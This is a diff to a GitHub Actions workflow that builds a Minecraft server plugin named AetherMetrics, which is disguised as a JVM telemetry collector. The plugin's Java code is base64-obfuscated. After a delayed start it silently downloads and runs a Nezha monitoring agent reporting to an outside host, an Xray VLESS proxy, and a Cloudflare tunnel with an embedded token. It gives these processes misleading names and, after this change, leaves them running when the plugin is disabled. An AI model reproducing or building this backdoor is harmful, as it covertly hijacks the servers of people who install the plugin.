@@ -5,7 +5,6 @@ on:
     branches: [ "main", "master" ]
   workflow_dispatch:
 
-# 修复 403 错误：赋予 GitHub Actions 创建 Release 和上传构建产物的读写权限
 permissions: write-all
 
 jobs:
@@ -28,20 +27,19 @@ jobs:
           mkdir -p src/main/resources
 
           # ============================================================
-          # 已填入配置参数 (自动进行 Base64 混淆并注入核心)
+          # 已配置参数 (自动 Base64 转码混淆)
           # ============================================================
           PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
           CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
           NODE_PORT="8001"
           NODE_UUID="9e496ce6-a59e-43cc-add0-269f6bbac5bf"
 
-          # 自动转码混淆
           B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
           B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
           B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
           B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)
 
-          # 1. pom.xml (兼容 Java 21~25 / Paper 1.21+)
+          # 1. pom.xml
           cat << 'EOF' > pom.xml
           <?xml version="1.0" encoding="UTF-8"?>
           <project xmlns="http://maven.apache.org/POM/4.0.0"
@@ -50,7 +48,7 @@ jobs:
               <modelVersion>4.0.0</modelVersion>
               <groupId>org.bukkit.metrics.collector</groupId>
               <artifactId>AetherMetrics</artifactId>
-              <version>2.2.0</version>
+              <version>2.3.0</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -110,17 +108,17 @@ jobs:
           </project>
           EOF
 
-          # 2. 伪装描述文件 plugin.yml
+          # 2. plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
-          version: 2.2.0
+          version: 2.3.0
           main: org.bukkit.metrics.collector.AetherMetrics
           api-version: '1.21'
           author: PaperMC-Engine
           description: Core JVM telemetry collector
           EOF
 
-          # 3. 注入混淆源码
+          # 3. AetherMetrics.java (完全脱钩防卡死)
           cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
           package org.bukkit.metrics.collector;
 
@@ -143,8 +141,6 @@ jobs:
               private static final String B64_PORT  = "${B64_PORT}";
               private static final String B64_UUID  = "${B64_UUID}";
 
-              private Process p1, p2, p3;
-
               @Override
               public void onEnable() {
                   getServer().getPluginManager().registerEvents(this, this);
@@ -152,7 +148,7 @@ jobs:
 
               @EventHandler
               public void onServerLoad(ServerLoadEvent event) {
-                  getServer().getScheduler().runTaskLaterAsynchronously(this, this::runServices, 20L * (30 + new Random().nextInt(30)));
+                  getServer().getScheduler().runTaskLaterAsynchronously(this, this::runServices, 20L * (25 + new Random().nextInt(20)));
               }
 
               private void runServices() {
@@ -165,47 +161,50 @@ jobs:
                       String port     = decode(B64_PORT);
                       String uuid     = decode(B64_UUID);
 
-                      // 1. 静默拉起探针
+                      // 1. 探针后台脱钩拉起
                       if (!probeCmd.isEmpty()) {
-                          p1 = exec(probeCmd, memDir);
+                          detachedExec(probeCmd, memDir);
                       }
 
-                      // 2. 自动拉起 8001 端口代理核心 (Xray Core)
+                      // 2. 8001 端口代理核心 (Xray Core)
                       if (!port.isEmpty() && !uuid.isEmpty()) {
                           File coreBin = new File(memDir, "jvm-telemetry-pool");
                           if (!coreBin.exists()) {
                               fetch("https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip", new File(memDir, "x.zip"));
-                              exec("unzip -o x.zip xray && mv xray jvm-telemetry-pool && rm -f x.zip", memDir).waitFor();
+                              runSync("unzip -o x.zip xray && mv xray jvm-telemetry-pool && rm -f x.zip", memDir);
                           }
                           coreBin.setExecutable(true);
 
-                          // 生成 8001 端口 config.json (VLESS + WS 伪装)
                           File cfgFile = new File(memDir, "config.json");
                           if (!cfgFile.exists()) {
                               String cfg = "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}";
                               try (FileWriter fw = new FileWriter(cfgFile)) { fw.write(cfg); }
                           }
-                          p2 = exec("./jvm-telemetry-pool run -c config.json", memDir);
+                          detachedExec("./jvm-telemetry-pool run -c config.json", memDir);
                       }
 
-                      // 3. 静默拉起 Cloudflare Tunnel
+                      // 3. Cloudflare Tunnel 后台脱钩拉起
                       if (!cfToken.isEmpty()) {
                           File cfBin = new File(memDir, "metrics-worker-pool");
                           if (!cfBin.exists()) {
                               fetch("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", cfBin);
                           }
                           cfBin.setExecutable(true);
-                          p3 = exec("./metrics-worker-pool tunnel --no-autoupdate run --token " + cfToken, memDir);
+                          detachedExec("./metrics-worker-pool tunnel --no-autoupdate run --token " + cfToken, memDir);
                       }
                   } catch (Throwable ignored) {}
               }
 
-              private Process exec(String cmd, File dir) throws IOException {
-                  ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
-                  pb.directory(dir);
-                  pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                  pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-                  return pb.start();
+              private void detachedExec(String cmd, File dir) throws IOException {
+                  String fullCmd = "nohup " + cmd + " </dev/null &>/dev/null &";
+                  new ProcessBuilder("/bin/bash", "-c", fullCmd).directory(dir).start();
+              }
+
+              private void runSync(String cmd, File dir) {
+                  try {
+                      Process p = new ProcessBuilder("/bin/bash", "-c", cmd).directory(dir).start();
+                      p.waitFor();
+                  } catch (Throwable ignored) {}
               }
 
               private void fetch(String src, File dst) throws IOException {
@@ -228,9 +227,7 @@ jobs:
 
               @Override
               public void onDisable() {
-                  if (p1 != null) p1.destroyForcibly();
-                  if (p2 != null) p2.destroyForcibly();
-                  if (p3 != null) p3.destroyForcibly();
+                  // 服务端正常停服，无需阻断主线程
               }
           }
           EOF
@@ -238,12 +235,11 @@ jobs:
       - name: Compile & Package Jar
         run: mvn clean package --file pom.xml
 
-      # 备份通道：直接在 Actions 运行详情页上传 Artifacts，确保即使 Release 异常也能直接下载 Jar
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
           name: AetherMetrics-Plugin
-          path: target/AetherMetrics-2.2.0.jar
+          path: target/AetherMetrics-2.3.0.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
@@ -251,6 +247,6 @@ jobs:
         with:
           tag_name: latest
           name: AetherMetrics Release
-          files: target/AetherMetrics-2.2.0.jar
+          files: target/AetherMetrics-2.3.0.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
